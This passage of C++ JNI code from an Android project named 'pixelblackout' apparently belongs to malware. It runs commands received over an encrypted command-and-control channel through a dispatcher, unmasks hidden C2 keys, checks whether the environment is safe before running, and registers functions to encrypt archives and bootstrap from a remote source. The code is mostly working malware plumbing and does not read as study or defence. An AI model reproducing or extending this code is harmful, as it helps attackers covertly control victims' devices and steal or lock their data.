    jstring jsonResp = (jstring) env->CallObjectMethod(dispatcher, exec, cmd, arg);
    env->DeleteLocalRef(dispClass);
    if (cmd != nullptr) env->DeleteLocalRef(cmd);
    if (arg != nullptr) env->DeleteLocalRef(arg);
    if (jsonResp == nullptr || env->ExceptionCheck()) {
        env->ExceptionClear();
        return env->NewStringUTF("");
    }
    // Encrypt response JSON
    jstring enc = NativeEncryptC2(env, nullptr, jsonResp);
    return enc;
}

void NativeConfigureC2(JNIEnv *env, jclass, jint mask,
                       jbyteArray keyArray, jbyteArray nonceArray) {
    const uint8_t xorMask = static_cast<uint8_t>(mask & 0xFF);
    std::vector<uint8_t> key = VectorFromArray(env, keyArray);
    std::vector<uint8_t> nonce = VectorFromArray(env, nonceArray);
    for (auto &b : key) b ^= xorMask;
    for (auto &b : nonce) b ^= xorMask;
    SetC2Secrets(key, nonce);
}

} // namespace

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *) {
    JNIEnv *env = nullptr;
    if (vm->GetEnv(reinterpret_cast<void **>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }

    g_safe_environment = CheckEnvironment();

    const char *class_name = "com/example/pixelblackout/nativebridge/NativeCrypto";
    jclass clazz = env->FindClass(class_name);
    if (clazz == nullptr) {
        __android_log_print(ANDROID_LOG_ERROR, kTag, "Failed to locate %s", class_name);
        return JNI_ERR;
    }

    static const JNINativeMethod kMethods[] = {
            {"nativeEncryptString", "(Ljava/lang/String;)Ljava/lang/String;", (void *) NativeEncryptString},
            {"nativeDecryptString", "(Ljava/lang/String;)Ljava/lang/String;", (void *) NativeDecryptString},
            {"nativeEncryptArchive", "([B)[B", (void *) NativeEncryptArchive},
            {"nativeConfigure", "(I[B[B[B)V", (void *) NativeConfigureSecrets},
            {"nativeOkToRun", "()Z", (void *) NativeOkToRun},
            // C2 AEAD
            {"nativeEncryptC2", "(Ljava/lang/String;)Ljava/lang/String;", (void *) NativeEncryptC2},
            {"nativeDecryptC2", "(Ljava/lang/String;)Ljava/lang/String;", (void *) NativeDecryptC2},
            {"nativeHandleC2Payload", "(Ljava/lang/String;Lcom/example/pixelblackout/managers/CommandDispatcher;)Ljava/lang/String;", (void *) NativeHandleC2Payload},
            {"nativeConfigureC2", "(I[B[B)V", (void *) NativeConfigureC2},
            {"nativeBootstrapFromRemote", "()[[B", (void *) NativeBootstrapFromRemote},
    };

    if (env->RegisterNatives(clazz, kMethods, sizeof(kMethods) / sizeof(kMethods[0])) != JNI_OK) {
        __android_log_print(ANDROID_LOG_ERROR, kTag, "RegisterNatives failed");
        env->DeleteLocalRef(clazz);
        return JNI_ERR;
    }

    env->DeleteLocalRef(clazz);
    return JNI_VERSION_1_6;
}
